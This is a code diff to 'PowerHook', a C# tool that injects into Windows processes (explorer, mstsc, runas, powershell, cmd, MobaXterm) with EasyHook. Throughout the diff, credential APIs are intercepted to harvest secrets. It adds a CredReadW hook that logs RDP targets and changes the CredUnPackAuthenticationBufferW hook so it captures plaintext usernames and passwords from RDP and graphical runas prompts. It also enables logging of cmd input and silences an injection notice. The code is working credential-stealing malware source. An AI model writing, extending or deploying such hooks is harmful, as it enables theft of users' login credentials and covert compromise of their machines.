@@ -11,6 +11,133 @@ namespace PowerHook
     public class InjectionEntryPoint : EasyHook.IEntryPoint
     {
 
+
+        // flags
+        public enum CRED_TYPE : uint
+        {
+            GENERIC = 1,
+            DOMAIN_PASSWORD = 2,
+            DOMAIN_CERTIFICATE = 3,
+            DOMAIN_VISIBLE_PASSWORD = 4,
+            GENERIC_CERTIFICATE = 5,
+            DOMAIN_EXTENDED = 6,
+            MAXIMUM = 7,      // Maximum supported cred type
+            MAXIMUM_EX = (MAXIMUM + 1000),  // Allow new applications to run on old OSes
+        }
+
+        public enum CRED_PERSIST : uint
+        {
+            SESSION = 1,
+            LOCAL_MACHINE = 2,
+            ENTERPRISE = 3,
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+        public struct CREDENTIAL_ATTRIBUTE
+        {
+            string Keyword;
+            uint Flags;
+            uint ValueSize;
+            IntPtr Value;
+        }
+
+        //This type is deliberately not designed to be marshalled.
+        public class Credential
+        {
+            public UInt32 Flags;
+            public CRED_TYPE Type;
+            public string TargetName;
+            public string Comment;
+            public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
+            public byte[] CredentialBlob;
+            public CRED_PERSIST Persist;
+            public CREDENTIAL_ATTRIBUTE[] Attributes;
+            public string TargetAlias;
+            public string UserName;
+        }
+
+        /// <summary>
+        ///
+        /// </summary>
+        public class CredentialInMarshaler : ICustomMarshaler
+        {
+            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+            private class NATIVECREDENTIAL
+            {
+                public UInt32 Flags;
+                public CRED_TYPE Type;
+                public string TargetName;
+                public string Comment;
+                public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
+                public UInt32 CredentialBlobSize;
+                public IntPtr CredentialBlob;
+                public CRED_PERSIST Persist;
+                public UInt32 AttributeCount;
+                public IntPtr Attributes;
+                public string TargetAlias;
+                public string UserName;
+            }
+
+            public void CleanUpManagedData(object ManagedObj)
+            {
+                // Nothing to do since all data can be garbage collected.
+            }
+            [DllImport("advapi32.dll", SetLastError = true)]
+            static extern bool CredFree([In] IntPtr buffer);
+            public void CleanUpNativeData(IntPtr pNativeData)
+            {
+                if (pNativeData == IntPtr.Zero)
+                {
+                    return;
+                }
+                CredFree(pNativeData);
+            }
+
+            public int GetNativeDataSize()
+            {
+                throw new NotImplementedException();
+            }
+
+            public IntPtr MarshalManagedToNative(object obj)
+            {
+                throw new NotImplementedException();
+            }
+
+            public object MarshalNativeToManaged(IntPtr pNativeData)
+            {
+                if (pNativeData == IntPtr.Zero)
+                {
+                    return null;
+                }
+
+                NATIVECREDENTIAL lRawCredential = (NATIVECREDENTIAL)Marshal.PtrToStructure(pNativeData, typeof(NATIVECREDENTIAL));
+
+                Credential lCredential = new Credential()
+                {
+                    UserName = lRawCredential.UserName,
+                    TargetName = lRawCredential.TargetName,
+                    TargetAlias = lRawCredential.TargetAlias,
+                    Persist = lRawCredential.Persist,
+                    Comment = lRawCredential.Comment,
+                    Flags = lRawCredential.Flags,
+                    LastWritten = lRawCredential.LastWritten,
+                    Type = lRawCredential.Type,
+                    CredentialBlob = new byte[lRawCredential.CredentialBlobSize],
+                    Attributes = new CREDENTIAL_ATTRIBUTE[lRawCredential.AttributeCount]
+                };
+
+                Marshal.Copy(lRawCredential.CredentialBlob, lCredential.CredentialBlob, 0, (int)lRawCredential.CredentialBlobSize);
+
+                return lCredential;
+            }
+
+            public static ICustomMarshaler GetInstance(string cookie)
+            {
+                return new CredentialInMarshaler();
+            }
+        }
+
+
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
         public struct UNICODE_STRING
         {
@@ -19,7 +146,6 @@ namespace PowerHook
             [MarshalAs(UnmanagedType.LPWStr)]
             public string Buffer;
         }
-
 
 
         [Flags]
@@ -69,6 +195,10 @@ namespace PowerHook
             public IntPtr stdOutput;
             public IntPtr stdError;
         }
+        // End flags
+
+
+
         /// <summary>
         /// Reference to the server interface
         /// </summary>
@@ -121,10 +251,9 @@ namespace PowerHook
 
 
             //Install hooks
-
-
-            if (currentProcess == "explorer")
+            if (currentProcess == "explorer" || currentProcess == "mstsc")
             {
+                //Hooks graphical runas and mstsc (both use the same function)
                 LoadLibrary("Credui.dll");
                 var CredUnPackAuthenticationBufferW = EasyHook.LocalHook.Create(
                 EasyHook.LocalHook.GetProcAddress("Credui.dll", "CredUnPackAuthenticationBufferW"),
@@ -133,6 +262,16 @@ namespace PowerHook
 
                 // Activate hooks on all threads except the current thread
                 CredUnPackAuthenticationBufferW.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
+
+                //Used to give us the target url from mstsc
+                LoadLibrary("Advapi32.dll");
+                var CredReadW = EasyHook.LocalHook.Create(
+                EasyHook.LocalHook.GetProcAddress("Advapi32.dll", "CredReadW"),
+                new CredReadW_Delegate(CredReadW_Hook),
+                this);
+
+                // Activate hooks on all threads except the current thread
+                CredReadW.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
             }
 
              if (currentProcess == "runas" || currentProcess == "powershell")
@@ -148,18 +287,6 @@ namespace PowerHook
                 CreateProcessWithLogonW.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
             }
                     
-            if (currentProcess == "mstsc")
-            {
-                // mstsc hook function (CredUnPackAuthenticationBufferW didnt work need to check, this is better then that function)
-                LoadLibrary("dpapi.dll");
-                var createCryptHook = EasyHook.LocalHook.Create(
-                EasyHook.LocalHook.GetProcAddress("dpapi.dll", "CryptProtectMemory"),
-                new CryptProtectMemory_Delegate(CryptProtectMemory_Hook),
-                this);
-
-                //Activate hooks on all threads except the current thread
-                createCryptHook.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
-            }
             
             if (currentProcess == "MobaXterm")
             {
@@ -188,7 +315,7 @@ namespace PowerHook
             }
 
 
-            _server.ReportMessage("[+] Hooked into " + context.HostPID.ToString());
+            //_server.ReportMessage("[+] Hooked into " + context.HostPID.ToString());
 
             // Wake up the process (required if using RemoteHooking.CreateAndInject)
             EasyHook.RemoteHooking.WakeUpProcess();
@@ -223,13 +350,6 @@ namespace PowerHook
             {
                 // Ping() or ReportMessages() will raise an exception if host is unreachable
             }
-
-            // Remove hooks
-
-            //CreateProcessWithLogonW.Dispose();
-            //createCryptHook.Dispose();
-            //CreateCharUpperBuffA.Dispose();
-            //CreateRtlInitUnicodeStringEx.Dispose();
          
             // Finalise cleanup of hooks
             EasyHook.LocalHook.Release();
@@ -237,24 +357,52 @@ namespace PowerHook
 
 
 
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
+        delegate bool CredReadW_Delegate(string target, CRED_TYPE type, int reservedFlag, [MarshalAs(UnmanagedType.CustomMarshaler, MarshalTypeRef = typeof(CredentialInMarshaler))] out Credential credential);
+        [DllImport("Advapi32.dll", EntryPoint = "CredReadW", CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern bool CredReadW(string target, CRED_TYPE type, int reservedFlag,[MarshalAs(UnmanagedType.CustomMarshaler, MarshalTypeRef = typeof(CredentialInMarshaler))] out Credential credential);
+
+
+        bool CredReadW_Hook(
+            string target, 
+            CRED_TYPE type, 
+            int reservedFlag, 
+            [MarshalAs(UnmanagedType.CustomMarshaler, 
+            MarshalTypeRef = typeof(CredentialInMarshaler))] out Credential credential)
+        {
+            try
+            {
+                lock (this._messageQueue)
+                {
+                    if (this._messageQueue.Count < 1000)
+                    {
+
+                        String Data = target;
+
+                        this._messageQueue.Enqueue(
+                        string.Format("[+] Found Potential RDP url --> {0}", Data));
+
+
+                    }
+                }
+            }
+            catch
+            {
+                // swallow exceptions so that any issues caused by this code do not crash target process
+            }
+            return CredReadW(target, type, reservedFlag,out credential);
+        }
+
+
+        // MSTSC+Graphical Runas
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
-        delegate bool CredUnPackAuthenticationBufferW_Delegate(uint dwFlags, out IntPtr pAuthBuffer, uint cbAuthBuffer, [MarshalAs(UnmanagedType.LPWStr)] String pszUserName, ref uint pcchMaxUserName, [MarshalAs(UnmanagedType.LPWStr)] String pszDomainName, ref uint pcchMaxDomainName, [MarshalAs(UnmanagedType.LPWStr)] String pszPassword, ref uint pcchMaxPassword);
-        [DllImport("Credui.dll", EntryPoint = "CredUnPackAuthenticationBufferW", SetLastError = true, CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
-        static extern bool CredUnPackAuthenticationBufferW(uint dwFlags, out IntPtr pAuthBuffer, uint cbAuthBuffer, [MarshalAs(UnmanagedType.LPWStr)] String pszUserName, ref uint pcchMaxUserName, [MarshalAs(UnmanagedType.LPWStr)] String pszDomainName, ref uint pcchMaxDomainName, [MarshalAs(UnmanagedType.LPWStr)] String pszPassword, ref uint pcchMaxPassword);
+        delegate bool CredUnPackAuthenticationBufferW_Delegate(int dwFlags, IntPtr pAuthBuffer, uint cbAuthBuffer, StringBuilder pszUserName, ref int pcchMaxUserName, StringBuilder pszDomainName, ref int pcchMaxDomainame, StringBuilder pszPassword, ref int pcchMaxPassword);
+        [DllImport("Credui.dll", CharSet = CharSet.Auto)]
+        static extern bool CredUnPackAuthenticationBufferW(int dwFlags, IntPtr pAuthBuffer, uint cbAuthBuffer, StringBuilder pszUserName, ref int pcchMaxUserName, StringBuilder pszDomainName, ref int pcchMaxDomainame, StringBuilder pszPassword, ref int pcchMaxPassword);
 
         bool CredUnPackAuthenticationBufferW_Hook(
-           uint dwFlags, 
-           out IntPtr pAuthBuffer, 
-           uint cbAuthBuffer, 
-           [MarshalAs(UnmanagedType.LPWStr)] String pszUserName, 
-           ref uint pcchMaxUserName, 
-           [MarshalAs(UnmanagedType.LPWStr)] String pszDomainName, 
-           ref uint pcchMaxDomainName, 
-           [MarshalAs(UnmanagedType.LPWStr)] String pszPassword, 
-           ref uint pcchMaxPassword)
+           int dwFlags, IntPtr pAuthBuffer, uint cbAuthBuffer, StringBuilder pszUserName, ref int pcchMaxUserName, StringBuilder pszDomainName, ref int pcchMaxDomainame, StringBuilder pszPassword, ref int pcchMaxPassword)
         {
-            bool result = false;
-            result = CredUnPackAuthenticationBufferW(dwFlags, out pAuthBuffer, cbAuthBuffer, pszUserName, ref pcchMaxUserName, pszDomainName, ref pcchMaxDomainName, pszPassword, ref pcchMaxPassword);
             
             try
             {
@@ -264,11 +412,11 @@ namespace PowerHook
                     if (this._messageQueue.Count < 1000)
                     {
 
-                        //String Data = pszUserName;
+                        bool success = CredUnPackAuthenticationBufferW(dwFlags, pAuthBuffer, cbAuthBuffer, pszUserName, ref pcchMaxUserName, pszDomainName, ref pcchMaxDomainame, pszPassword, ref pcchMaxPassword);
 
                         this._messageQueue.Enqueue(
-                        string.Format("[+] Found credui Login --> {0}", pszPassword)); //doesnt work
-
+                        string.Format("[+] Found Graphical Runas/RDP Login --> Username: {0}, Password: {1}", pszUserName, pszPassword)); 
+                        return success;
 
                     }
                 }
@@ -279,17 +427,16 @@ namespace PowerHook
             {
                 // swallow exceptions so that any issues caused by this code do not crash target process
             }
-            return result;
+            return false;
         }
 
 
         //CMD
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
-        
         delegate bool RtlInitUnicodeStringEx_Delegate(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] String SourceString);
-
         [DllImport("ntdll.dll",EntryPoint = "RtlInitUnicodeStringEx", SetLastError = true, CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
         static extern bool RtlInitUnicodeStringEx(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] String SourceString);
+
 
         bool RtlInitUnicodeStringEx_Hook(
             ref UNICODE_STRING DestinationString,
@@ -302,14 +449,11 @@ namespace PowerHook
                     if (this._messageQueue.Count < 1000)
                     {
 
+                        String Data =  SourceString;
 
-                        //String Data =  SourceString;
-
-                        //this._messageQueue.Enqueue(
-                        //string.Format("[+] Found cmd Login --> {0}", Data));
+                        this._messageQueue.Enqueue(
+                        string.Format("[+] Found cmd data --> {0}", Data));
                         
-                        
-
 
                     }
                 }
@@ -363,47 +507,6 @@ namespace PowerHook
                 // swallow exceptions so that any issues caused by this code do not crash target process
             }
             return CharUpperBuffA(lpsz, cchLength);
-        }
-
-
-        //MSTSC
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi, SetLastError = true)]
-        delegate bool CryptProtectMemory_Delegate(IntPtr pData, uint cbData, uint dwFlags);
-        [DllImport("dpapi.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Ansi)]
-        static extern bool CryptProtectMemory(
-            IntPtr pData,
-            uint cbData,
-            uint dwFlags);
-
-        bool CryptProtectMemory_Hook(
-           IntPtr pData,
-           uint cbData,
-           uint dwFlags)
-        {
-
-            try
-            {
-                lock (this._messageQueue)
-                {
-                    if (this._messageQueue.Count < 1000)
-                    {
-
-
-                        //Get string from memory address passed to CryptProtectMemory
-                        var password = Marshal.PtrToStringUni(pData, (int)cbData);
-
-
-                        this._messageQueue.Enqueue(
-                            string.Format("[+] Found Potential RDP Creds -- > {0}", password));
-
-                    }
-                }
-            }
-            catch
-            {
-                // swallow exceptions so that any issues caused by this code do not crash target process
-            }
-            return CryptProtectMemory(pData, cbData, dwFlags);
         }
 
 
